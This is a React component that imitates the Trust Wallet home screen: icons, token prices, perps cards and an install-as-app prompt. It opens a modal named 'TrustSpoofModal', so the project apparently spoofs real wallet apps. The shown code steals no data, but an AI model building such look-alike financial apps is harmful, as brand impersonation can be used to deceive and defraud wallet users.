import React, { useCallback, useEffect, useMemo, useState } from 'react';
import {
  fetchBasePrices,
  getTokenQuote,
  getFallbackIconUrl,
  useWalletStore,
} from '../../store/useWalletStore';
import PullToRefresh from '../../components/PullToRefresh';
import TrustSpoofModal from './TrustSpoofModal';
import TrustTokenDetail from './TrustTokenDetail';
import './TrustWallet.css';

/* ---------------------------------- icons --------------------------------- */

const IconWalletAvatar = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
    <path d="M7.6 6.4V6a3.2 3.2 0 0 1 3.2-3.2h2.4A3.2 3.2 0 0 1 16.4 6v.4" stroke="#fff" strokeWidth="2.1" strokeLinecap="round" />
    <rect x="2.4" y="6.4" width="19.2" height="13.6" rx="3.6" fill="#fff" />
    <circle cx="16.9" cy="13.2" r="1.8" fill="#4343ee" />
  </svg>
);

const IconHistory = () => (
  <svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8" />
    <path d="M3 3v5h5" />
    <path d="M12 7.2V12l3.4 1.8" />
  </svg>
);

const IconScan = () => (
  <svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <path d="M3 7.2V5.4A2.4 2.4 0 0 1 5.4 3h1.8" />
    <path d="M16.8 3h1.8A2.4 2.4 0 0 1 21 5.4v1.8" />
    <path d="M21 16.8v1.8a2.4 2.4 0 0 1-2.4 2.4h-1.8" />
    <path d="M7.2 21H5.4A2.4 2.4 0 0 1 3 18.6v-1.8" />
    <rect x="8.2" y="8.2" width="3" height="3" rx="0.7" fill="currentColor" stroke="none" />
    <rect x="12.8" y="12.8" width="3" height="3" rx="0.7" fill="currentColor" stroke="none" />
  </svg>
);

const IconInfo = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
    <circle cx="12" cy="4.9" r="2.1" />
    <rect x="10.1" y="9.4" width="3.8" height="11" rx="1.9" />
  </svg>
);

const IconDollarCircle = () => (
  <svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <circle cx="12" cy="12" r="9.4" />
    <path d="M15.6 8.4h-4.4a2.1 2.1 0 1 0 0 4.2h1.6a2.1 2.1 0 1 1 0 4.2H8.4" />
    <path d="M12 18.4V5.6" />
  </svg>
);

const IconChevronRight = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3.1" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <path d="m9 5 7 7-7 7" />
  </svg>
);

const IconQr = () => (
  <svg width="30" height="30" viewBox="0 0 24 24" fill="none" aria-hidden="true">
    <rect x="2.8" y="2.8" width="7.4" height="7.4" rx="2" stroke="currentColor" strokeWidth="2" />
    <rect x="5.6" y="5.6" width="1.8" height="1.8" rx="0.5" fill="currentColor" />
    <rect x="13.6" y="2.8" width="4.6" height="4.6" rx="1.4" fill="currentColor" />
    <rect x="19.4" y="2.8" width="2" height="2" rx="0.6" fill="currentColor" />
    <rect x="19.4" y="6.2" width="2" height="2" rx="0.6" fill="currentColor" />
    <rect x="2.8" y="13.6" width="4.6" height="4.6" rx="1.4" fill="currentColor" />
    <rect x="2.8" y="19.4" width="2" height="2" rx="0.6" fill="currentColor" />
    <rect x="6.2" y="19.4" width="2" height="2" rx="0.6" fill="currentColor" />
    <rect x="13.6" y="13.6" width="2" height="2" rx="0.6" fill="currentColor" />
    <rect x="16.9" y="16.9" width="2" height="2" rx="0.6" fill="currentColor" />
    <rect x="19.4" y="13.6" width="2" height="2" rx="0.6" fill="currentColor" />
    <rect x="13.6" y="19.4" width="2" height="2" rx="0.6" fill="currentColor" />
    <rect x="19.4" y="19.4" width="2" height="2" rx="0.6" fill="currentColor" />
  </svg>
);

const IconBnb = ({ size = 32 }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
    <path d="M12 2.4 14.5 4.9 12 7.4 9.5 4.9 12 2.4Z" />
    <path d="M6.1 8.9 8.6 11.4 6.1 13.9 3.6 11.4 6.1 8.9Z" />
    <path d="M17.9 8.9 20.4 11.4 17.9 13.9 15.4 11.4 17.9 8.9Z" />
    <path d="M12 8.9 14.5 11.4 12 13.9 9.5 11.4 12 8.9Z" />
    <path d="M12 15.4 14.5 17.9 12 20.4 9.5 17.9 12 15.4Z" />
  </svg>
);

const IconBtc = () => (
  <svg width="25" height="25" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
    <path d="M23.189 14.02c.314-2.096-1.283-3.223-3.465-3.975l.708-2.84-1.728-.43-.69 2.765c-.454-.114-.92-.22-1.385-.326l.695-2.783L15.596 6l-.708 2.839c-.376-.086-.746-.17-1.104-.26l.002-.009-2.384-.595-.46 1.846s1.283.294 1.256.312c.7.175.826.638.805 1.006l-.806 3.235c.048.012.11.03.18.057l-.183-.045-1.13 4.532c-.086.212-.303.531-.793.41.018.025-1.256-.313-1.256-.313l-.858 1.978 2.25.561c.418.105.828.215 1.231.318l-.715 2.872 1.727.43.708-2.84c.472.127.93.245 1.378.357l-.706 2.828 1.728.43.715-2.866c2.948.558 5.164.333 6.097-2.333.752-2.146-.037-3.385-1.588-4.192 1.13-.26 1.98-1.003 2.207-2.538zm-3.95 5.538c-.533 2.147-4.148.986-5.32.695l.95-3.805c1.172.293 4.929.873 4.37 3.11zm.535-5.569c-.487 1.953-3.495.96-4.47.717l.86-3.45c.975.243 4.118.696 3.61 2.733z" />
  </svg>
);

const IconEth = () => (
  <svg width="23" height="23" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
    <g fillRule="nonzero">
      <path fillOpacity=".602" d="M12 2v7.37l6 2.68z" />
      <path d="M12 2L6 12.05l6-2.68z" />
      <path fillOpacity=".602" d="M12 16.24v4.9L18 13.2z" />
      <path d="M12 21.14v-4.9L6 13.2z" />
      <path fillOpacity=".2" d="M12 15.08l6-3.03-6-2.68z" />
      <path fillOpacity=".602" d="M6 12.05l6 3.03v-5.71z" />
    </g>
  </svg>
);

const IconApplePay = () => (
  <span className="tw-applepay" aria-hidden="true">
    <svg width="19" height="23" viewBox="0 0 814 1000" fill="currentColor">
      <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 790.7 0 663 0 541.8c0-194.4 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z" />
    </svg>
    <span>Pay</span>
  </span>
);

const IconHome = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true">
    <path
      fill="currentColor"
      d="M12 3.1c.4 0 .79.13 1.11.38l6.9 5.42c.42.33.67.84.67 1.38v8.22c0 1.05-.85 1.9-1.9 1.9h-3.3a.9.9 0 0 1-.9-.9v-3.06c0-1.06-.86-1.92-1.92-1.92h-1.32c-1.06 0-1.92.86-1.92 1.92v3.06a.9.9 0 0 1-.9.9H5.22c-1.05 0-1.9-.85-1.9-1.9v-8.22c0-.54.25-1.05.67-1.38l6.9-5.42A1.79 1.79 0 0 1 12 3.1Z"
    />
  </svg>
);

const IconTrending = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <path d="M16 7h6v6" />
    <path d="m22 7-8.5 8.5-5-5L2 17" />
  </svg>
);

const IconInfinity = () => (
  <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <path d="M12 12c-2-2.67-4-4-6-4a4 4 0 1 0 0 8c2 0 4-1.33 6-4Zm0 0c2 2.67 4 4 6 4a4 4 0 0 0 0-8c-2 0-4 1.33-6 4Z" />
  </svg>
);

const IconCompass = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <circle cx="12" cy="12" r="9.3" />
    <path d="m16.2 7.8-1.9 6.5-6.5 1.9 1.9-6.5 6.5-1.9z" />
  </svg>
);

const IconSearch = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1" strokeLinecap="round" aria-hidden="true">
    <circle cx="11" cy="11" r="7.3" />
    <path d="m20.6 20.6-4.7-4.7" />
  </svg>
);

/* --------------------------------- helpers -------------------------------- */

const SYMBOL_NAMES = { BTC: 'Bitcoin', ETH: 'Ethereum', BNB: 'BNB Smart Chain' };
const SYMBOL_ORDER = { BTC: 0, ETH: 1, BNB: 2 };

const DEFAULT_TOKEN_META = {
  BTC: { marketKey: 'bitcoin', network: 'Bitcoin', dexscreenerAddress: '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599' },
  ETH: { marketKey: 'ethereum', network: 'Ethereum', dexscreenerAddress: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2' },
  BNB: { marketKey: 'bnb', network: 'BNB Smart Chain', dexscreenerAddress: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c' },
};

const START_ACTIONS = [
  { key: 'receive', lines: ['Receive', 'crypto'], icon: <IconQr /> },
  { key: 'deposit', lines: ['Deposit from', 'Binance'], icon: <span className="tw-bnb-glyph"><IconBnb size={34} /></span> },
  { key: 'buy', lines: ['Buy with', 'Apple Pay'], icon: <IconApplePay /> },
];

const PERPS = [
  { symbol: 'BTC', lev: '40x' },
  { symbol: 'HYPE', lev: '10x' },
  { symbol: 'ETH', lev: '25x' },
  { symbol: 'SOL', lev: '20x' },
];

function formatMoney(value) {
  if (!value || Math.abs(value) < 0.01) return '$0.00';
  return `$${value.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
}

function MarketIcon({ symbol, imageUrl }) {
  const [hasError, setHasError] = useState(false);

  useEffect(() => {
    setHasError(false);
  }, [imageUrl]);

  if (symbol === 'BTC') return <span className="tw-mkt-icon tw-mkt-btc"><IconBtc /></span>;
  if (symbol === 'ETH') return <span className="tw-mkt-icon tw-mkt-eth"><IconEth /></span>;
  if (symbol === 'BNB') return <span className="tw-mkt-icon tw-mkt-bnb"><IconBnb size={26} /></span>;
  if (imageUrl && !hasError) {
    return (
      <span className="tw-mkt-icon">
        <img src={imageUrl} alt="" onError={() => setHasError(true)} />
      </span>
    );
  }
  return <span className="tw-mkt-icon tw-mkt-fallback"><span>{(symbol || '?').slice(0, 1)}</span></span>;
}

/* -------------------------------- component ------------------------------- */

export default function TrustWallet() {
  const { trust, setPhantomPrices, addTrustToken } = useWalletStore();
  const [showSetupModal, setShowSetupModal] = useState(false);
  const [showAllTokens, setShowAllTokens] = useState(false);
  const [selectedTokenId, setSelectedTokenId] = useState(null);
  const [deferredInstallPrompt, setDeferredInstallPrompt] = useState(null);
  const [isStandalone, setIsStandalone] = useState(
    () => window.matchMedia?.('(display-mode: standalone)').matches || window.navigator.standalone === true
  );

  const refreshTrust = useCallback(async () => {
    const prices = await fetchBasePrices();
    if (Object.keys(prices).length > 0) {
      setPhantomPrices(prices);
    }
  }, [setPhantomPrices]);

  useEffect(() => {
    refreshTrust();
    const timer = window.setInterval(refreshTrust, 60000);
    return () => window.clearInterval(timer);
  }, [refreshTrust]);

  useEffect(() => {
    const displayMode = window.matchMedia?.('(display-mode: standalone)');
    const handleModeChange = (event) => {
      setIsStandalone(event.matches || window.navigator.standalone === true);
    };
    const handleBeforeInstallPrompt = (event) => {
      event.preventDefault();
      setDeferredInstallPrompt(event);
    };
    const handleInstalled = () => {
      setDeferredInstallPrompt(null);
      setIsStandalone(true);
    };

    displayMode?.addEventListener?.('change', handleModeChange);
    window.addEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
    window.addEventListener('appinstalled', handleInstalled);

    return () => {
      displayMode?.removeEventListener?.('change', handleModeChange);
      window.removeEventListener('beforeinstallprompt', handleBeforeInstallPrompt);
      window.removeEventListener('appinstalled', handleInstalled);
    };
  }, []);

  const handleInstallApp = useCallback(async () => {
    if (!deferredInstallPrompt) return;
    await deferredInstallPrompt.prompt();
    await deferredInstallPrompt.userChoice;
    setDeferredInstallPrompt(null);
  }, [deferredInstallPrompt]);

  const marketRows = useMemo(() => {
    const rows = (trust.tokens || []).map((token) => {
      const quote = getTokenQuote(token, trust.prices);
      return {
        key: token.id ?? `${token.symbol}-${token.network ?? ''}`,
        symbol: token.symbol,
        name: token.name || SYMBOL_NAMES[token.symbol] || token.symbol,
        price: quote?.usd ?? 0,
        change: Number(quote?.change ?? 0),
        imageUrl: quote?.imageUrl || token.icon || '',
        token,
      };
    });

    if (rows.length === 0) {
      return Object.entries(SYMBOL_NAMES).map(([symbol, name]) => ({
        key: symbol,
        symbol,
        name,
        price: 0,
        change: 0,
        imageUrl: '',
        token: null,
      }));
    }

    return [...rows].sort(
      (a, b) => (SYMBOL_ORDER[a.symbol] ?? 99) - (SYMBOL_ORDER[b.symbol] ?? 99)
    );
  }, [trust.tokens, trust.prices]);

  const selectedToken = useMemo(
    () => (trust.tokens || []).find((t) => t.id === selectedTokenId) || null,
    [trust.tokens, selectedTokenId]
  );

  const openToken = useCallback((row) => {
    const list = trust.tokens || [];

    // Already in the store? Open it.
    const existing =
      list.find((t) => row.token && t.id === row.token.id) ||
      list.find((t) => t.symbol === row.symbol);
    if (existing) {
      setSelectedTokenId(existing.id);
      return;
    }

    // Known default (BTC/ETH/BNB)? Create it, then read it back.
    const meta = DEFAULT_TOKEN_META[row.symbol];
    if (!meta) return;
    const id = `tw-default-${row.symbol.toLowerCase()}`;
    addTrustToken({
      id,
      name: row.name,
      symbol: row.symbol,
      amount: 0,
      icon: getFallbackIconUrl(meta.marketKey),
      currentPrice: row.price,
      priceChange24h: row.change,
      label: meta.network,
      network: meta.network,
      networkMarketKey: meta.marketKey,
      dexscreenerAddress: meta.dexscreenerAddress,
    });

    // Zustand updates are synchronous — read the fresh state so we
    // select whatever id the store actually assigned.
    const latest = useWalletStore.getState().trust?.tokens || [];
    const created =
      latest.find((t) => t.id === id) ||
      latest.find((t) => t.symbol === row.symbol);
    setSelectedTokenId(created ? created.id : id);
  }, [trust.tokens, addTrustToken]);

  const visibleRows = showAllTokens ? marketRows : marketRows.slice(0, 3);
  const canToggleTokenRows = marketRows.length > 3;

  /* Detail replaces the whole screen — same proven pattern as PhantomWallet */
if (selectedToken) {
  return (
    <div className="trust-app">
      <div className="tw-device-shell">
        <TrustTokenDetail token={selectedToken} onBack={() => setSelectedTokenId(null)} />
      </div>
    </div>
  );
}
  return (
    <div className="trust-app">
      <div className="tw-device-shell">
        <PullToRefresh className="tw-scroll" onRefresh={refreshTrust} indicatorTop={18}>
          <div className="tw-shell">
            <header className="tw-header">
              <button className="tw-wallet-pill" type="button" onClick={() => setShowSetupModal(true)}>
                <span className="tw-wallet-avatar"><IconWalletAvatar /></span>
                <span>{trust.walletName || 'Main Wallet'}</span>
              </button>
              <div className="tw-header-actions">
                <button className="tw-circle-btn" type="button" aria-label="History"><IconHistory /></button>
                <button className="tw-circle-btn" type="button" aria-label="Scan"><IconScan /></button>
              </div>
            </header>

            <section className="tw-banner">
              <span className="tw-banner-info"><IconInfo /></span>
              <span className="tw-banner-icon"><IconDollarCircle /></span>
              <div className="tw-banner-copy">
                <span className="tw-banner-title">0% swap fees on selected stables</span>
                <span className="tw-banner-sub">Applicable to same-chain swaps only</span>
              </div>
            </section>

            <h1 className="tw-hero-title">Get started by adding some crypto</h1>

            <div className="tw-start-grid">
              {START_ACTIONS.map((action) => (
                <div className="tw-start-item" key={action.key}>
                  <button
                    className="tw-start-card"
                    type="button"
                    aria-label={action.lines.join(' ')}
                    onClick={action.key === 'buy' ? () => setShowSetupModal(true) : undefined}
                  >
                    {action.icon}
                  </button>
                  <div className="tw-start-labels">
                    {action.lines.map((line) => <span key={line}>{line}</span>)}
                  </div>
                </div>
              ))}
            </div>

            <section className="tw-section-head">
              <button className="tw-section-link" type="button">
                Explore tokens
                <IconChevronRight />
              </button>
            </section>

            <div className="tw-market-list">
              {visibleRows.map((row) => {
                const negative = row.change < 0;
                return (
                  <button className="tw-market-row" type="button" key={row.key} onClick={() => openToken(row)}>
                    <MarketIcon symbol={row.symbol} imageUrl={row.imageUrl} />
                    <span className="tw-mkt-name">{row.name}</span>
                    <span className="tw-mkt-right">
                      <span className="tw-mkt-price">{formatMoney(row.price)}</span>
                      <span className={`tw-mkt-change ${negative ? 'neg' : 'pos'}`}>
                        {negative ? '' : '+'}{row.change.toFixed(2)}%
                      </span>
                    </span>
                  </button>
                );
              })}
            </div>

            {canToggleTokenRows ? (
              <button className="tw-view-all" type="button" onClick={() => setShowAllTokens((current) => !current)}>
                <span>{showAllTokens ? 'View less' : 'View all'}</span>
                <span className={`tw-view-all-chevron ${showAllTokens ? 'expanded' : ''}`}>
                  <IconChevronRight />
                </span>
              </button>
            ) : null}

            <section className="tw-section-head">
              <button className="tw-section-link" type="button">
                Perps
                <IconChevronRight />
              </button>
            </section>

            <div className="tw-perps-row">
              {PERPS.map((perp) => {
                const match = marketRows.find((row) => row.symbol === perp.symbol);
                return (
                  <button
                    className="tw-perp-card"
                    type="button"
                    key={perp.symbol}
                    onClick={() => { if (match) openToken(match); }}
                  >
                    <span className="tw-perp-top">
                      <span className="tw-perp-symbol">{perp.symbol}</span>
                      <span className="tw-perp-lev">{perp.lev}</span>
                    </span>
                    <span className="tw-perp-price">{match ? formatMoney(match.price) : '—'}</span>
                  </button>
                );
              })}
            </div>
          </div>
        </PullToRefresh>

        <nav className="tw-bottom-nav">
          <div className="tw-nav-pill">
            <button className="tw-nav-item active" type="button" aria-label="Home"><IconHome /></button>
            <button className="tw-nav-item" type="button" aria-label="Trending"><IconTrending /></button>
            <button className="tw-nav-item" type="button" aria-label="Perps"><IconInfinity /></button>
            <button className="tw-nav-item" type="button" aria-label="Discover"><IconCompass /></button>
          </div>
          <button className="tw-nav-search" type="button" aria-label="Search"><IconSearch /></button>
        </nav>
      </div>

      {showSetupModal ? (
        <TrustSpoofModal
          canInstall={Boolean(deferredInstallPrompt) && !isStandalone}
          isStandalone={isStandalone}
          onClose={() => setShowSetupModal(false)}
          onInstall={handleInstallApp}
        />
      ) : null}
    </div>
  );
}